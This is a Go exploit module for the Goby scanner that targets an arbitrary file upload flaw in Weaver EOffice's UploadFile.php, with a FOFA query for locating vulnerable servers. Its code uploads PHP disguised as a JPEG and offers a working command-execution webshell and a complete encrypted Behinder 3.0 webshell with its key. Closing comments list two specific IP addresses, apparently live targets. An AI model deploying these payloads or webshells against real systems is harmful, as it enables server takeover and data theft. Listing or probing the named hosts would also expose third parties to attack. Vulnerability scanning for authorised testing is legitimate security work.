package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver EOffice UploadFile.php File Upload",
    "Description": "<p>Weaver EOffice is a mobile, intelligent and electronic collaborative office platform.</p><p>There is an arbitrary file upload vulnerability in the UploadFile.php file of Weaver EOffice collaborative office system. Attackers can upload malicious Trojan horses to control server permissions.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.eofficeoa.com",
    "DisclosureDate": "2021-11-17",
    "Author": "1291904552@qq.com",
    "FofaQuery": "(((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\")",
    "GobyQuery": "(((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\")",
    "Level": "2",
    "Impact": "<p>There is an arbitrary file upload vulnerability in the UploadFile.php file of Weaver EOffice collaborative office system. Attackers can upload malicious Trojan horses to control server permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.eofficeoa.com\">https://www.eofficeoa.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "泛微 EOffice 协同办公平台 UploadFile.php 任意文件上传漏洞",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ],
            "Description": "<p>泛微-EOffice是一款移动化、智能化、电子化的协同办公平台。</p><p>泛微-EOffice协同办公平台 UploadFile.php 文件存在任意文件上传漏洞，攻击者可上传恶意木马控制服务器权限。</p>",
            "Impact": "<p>泛微-EOffice协同办公平台 UploadFile.php 文件存在任意文件上传漏洞，攻击者可上传恶意木马控制服务器权限。</p>",
            "Product": "泛微-EOffice",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.eofficeoa.com\">https://www.eofficeoa.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>"
        },
        "EN": {
            "Name": "Weaver EOffice UploadFile.php File Upload",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ],
            "Description": "<p>Weaver EOffice is a mobile, intelligent and electronic collaborative office platform.</p><p>There is an arbitrary file upload vulnerability in the UploadFile.php file of Weaver EOffice collaborative office system. Attackers can upload malicious Trojan horses to control server permissions.</p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in the UploadFile.php file of Weaver EOffice collaborative office system. Attackers can upload malicious Trojan horses to control server permissions.</p>",
            "Product": "Weaver-EOffice",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.eofficeoa.com\">https://www.eofficeoa.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>"
        }
    },
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "simple webshell,Behinder3.0"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=simple webshell"
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CVSSScore": "9.0",
    "AttackSurfaces": {
        "Application": [
            "Weaver-EOffice"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [],
    "CNVD": [],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Is0day": false,
    "PocId": "10239"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type","multipart/form-data; boundary=9eb3e8c30dcca26ab83aea06935f54fd")
			cfg.Data = "--9eb3e8c30dcca26ab83aea06935f54fd\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo md5(1231);unlink(__FILE__);?>\r\n--9eb3e8c30dcca26ab83aea06935f54fd--"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
				uri2 := "/images/logo/logo-eoffice.php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 &&strings.Contains(resp2.RawBody,"6c14da109e294d1e8155be8aa4b1ce8e")
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "simple webshell" {
				uri := "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Header.Store("Content-Type","multipart/form-data; boundary=9eb3e8c30dcca26ab83aea06935f54fd")
				cfg.Data = "--9eb3e8c30dcca26ab83aea06935f54fd\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_POST['x']);unlink(__FILE__);?>\r\n--9eb3e8c30dcca26ab83aea06935f54fd--"
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
					uri2 := "/images/logo/logo-eoffice.php"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type","application/x-www-form-urlencoded")
					cfg2.Data = "x="+ss.Params["cmd"].(string)
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
						expResult.Output = resp2.RawBody
						expResult.Success = true
					}
				}
			}
			if ss.Params["AttackType"].(string) == "Behinder3.0" {
				uri := "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Header.Store("Content-Type","multipart/form-data; boundary=9eb3e8c30dcca26ab83aea06935f54fd")
				cfg.Data = "--9eb3e8c30dcca26ab83aea06935f54fd\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n@error_reporting(0);\r\nsession_start();\r\n    $key=\"e45e329feb5d925b\";\r\n\t$_SESSION['k']=$key;\r\n\tsession_write_close();\r\n\t$post=file_get_contents(\"php://input\");\r\n\tif(!extension_loaded('openssl'))\r\n\t{\r\n\t\t$t=\"base64_\".\"decode\";\r\n\t\t$post=$t($post.\"\");\r\n\t\t\r\n\t\tfor($i=0;$i<strlen($post);$i++) {\r\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \r\n    \t\t\t}\r\n\t}\r\n\telse\r\n\t{\r\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\r\n\t}\r\n    $arr=explode('|',$post);\r\n    $func=$arr[0];\r\n    $params=$arr[1];\r\n\tclass C{public function __invoke($p) {eval($p.\"\");}}\r\n    @call_user_func(new C(),$params);\r\n?>\r\n--9eb3e8c30dcca26ab83aea06935f54fd--"
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/images/logo/logo-eoffice.php\n"
						expResult.Output += "Password：rebeyond\n"
						expResult.Output += "Webshell tool: Behinder v3.0"
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
//http://112.25.204.219:9090
//http://117.29.185.118:8082
//21%